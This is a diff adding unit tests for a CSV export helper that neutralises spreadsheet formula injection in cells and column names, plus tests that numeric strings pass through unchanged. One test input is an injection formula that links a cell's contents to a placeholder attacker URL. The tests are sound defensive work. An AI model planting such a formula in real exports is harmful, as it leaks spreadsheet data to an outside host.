@@ -35,6 +35,33 @@ describe("csvRow", () => {
   test("writes a boolean and a bigint as themselves", () => {
     expect(csvRow([true, false, BigInt(10)])).toBe("true,false,10");
   });
+
+  test("neutralises every leading character a spreadsheet reads as the start of a formula", () => {
+    expect(csvRow(['=HYPERLINK("http://attacker/"&A1)'])).toBe(`"'=HYPERLINK(""http://attacker/""&A1)"`);
+    expect(csvRow(["+1+1"])).toBe(`"'+1+1"`);
+    expect(csvRow(["-1+1"])).toBe(`"'-1+1"`);
+    expect(csvRow(["@SUM(A1)"])).toBe(`"'@SUM(A1)"`);
+    expect(csvRow(["\t=1+1"])).toBe(`"'\t=1+1"`);
+    expect(csvRow(["\r=1+1"])).toBe(`"'\r=1+1"`);
+  });
+
+  test("leaves a number alone, however it arrives, because a bare decimal cannot be a formula", () => {
+    expect(csvRow([-12.5, 12.5, BigInt(-10)])).toBe("-12.5,12.5,-10");
+    // A Postgres `numeric` reaches the export as a string, so the exemption is on the
+    // TEXT and not on the JavaScript type.
+    expect(csvRow(["-12.5", "-1e3", "+7", "-.5", "-1E+03"])).toBe("-12.5,-1e3,+7,-.5,-1E+03");
+  });
+
+  test("neutralises a value that only starts out numeric", () => {
+    expect(csvRow(["-1-2-3"])).toBe(`"'-1-2-3"`);
+    expect(csvRow(["-12.5.6"])).toBe(`"'-12.5.6"`);
+    expect(csvRow(["-"])).toBe(`"'-"`);
+  });
+
+  test("writes an ordinary value byte-identically, prefix and quotes included", () => {
+    expect(csvRow(["plain", "a=b", "3-4", "user@example.com", "", null])).toBe("plain,a=b,3-4,user@example.com,,");
+    expect(csvRow(["Acme, Inc."])).toBe('"Acme, Inc."');
+  });
 });
 
 describe("toCsv", () => {
@@ -62,6 +89,10 @@ describe("toCsv", () => {
   test("leaves a column a row does not carry empty rather than shifting the ones after it", () => {
     const csv = toCsv([{ a: 1, c: 3 }], ["a", "b", "c"]);
     expect(csv).toBe("a,b,c\n1,,3");
+  });
+
+  test("neutralises a column name a spreadsheet would evaluate, not only a cell", () => {
+    expect(toCsv([{ "=1+1": "plain" }])).toBe(`"'=1+1"\nplain`);
   });
 
   test("quotes a column name that needs it", () => {
